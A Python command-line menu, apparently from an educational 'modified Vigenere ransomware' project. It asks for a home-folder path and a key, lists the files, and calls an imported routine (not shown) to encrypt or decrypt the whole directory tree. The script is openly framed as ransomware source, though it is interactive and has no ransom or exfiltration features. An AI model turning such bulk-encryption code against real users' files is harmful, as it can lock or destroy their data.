#!/usr/bin/env python3

"""
Modified vigenere ransomware
"""

import os
from vigenere_ransomware import process_files

def get_user_choice():
    while True:
        print("Modified vigenere ransomware encryption/decryption:")
        print("Select an option:")
        print("1. Modified vigenere cipher ransomware encryption")
        print("2. Modified vigenere cipher ransomware decryption")
        print("3. Exit")

        try:
            choice = int(input("> "))
            if choice in [1, 2, 3]:
                return choice
            else:
                print("Invalid choice. Please select a valid option.")
        except ValueError:
            print("Invalid choice. Please select a valid option.")

def get_directory_path():
    while True:
        directory_input = input("\nInput the directory/folder path as the starting point:\n> ~/")
        directory_path = os.path.expanduser("~/" + directory_input)
        if os.path.exists(directory_path):
            return directory_path
        else:
            print("Invalid directory path. Please enter a valid path.")

def print_directory_files(directory_path):
    print("\nFiles in selected directory {0}:".format(directory_path))
    for dir_path, dir_names, file_names in os.walk(directory_path):
        for file in file_names:
            file_name, file_extension = os.path.splitext(file)
            formatted_file = f"{file_name}.{file_extension[1:]}"
            print("> " + formatted_file)

def get_key():
    return input("\nEnter the encryption/decryption key: ")

if __name__ == "__main__":
    while True:
        choice = get_user_choice()
        
        if choice == 1:
            directory_path = get_directory_path()
            print_directory_files(directory_path)

            key = get_key()
            process_files(directory_path, "encrypt", key)
            print("\n> Encryption completed.\n")

        elif choice == 2:
            directory_path = get_directory_path()
            print_directory_files(directory_path)

            key = get_key()
            process_files(directory_path, "decrypt", key)
            print("\n> Decryption completed.\n")

        else:
            print("\n> Exiting the program.")
            break
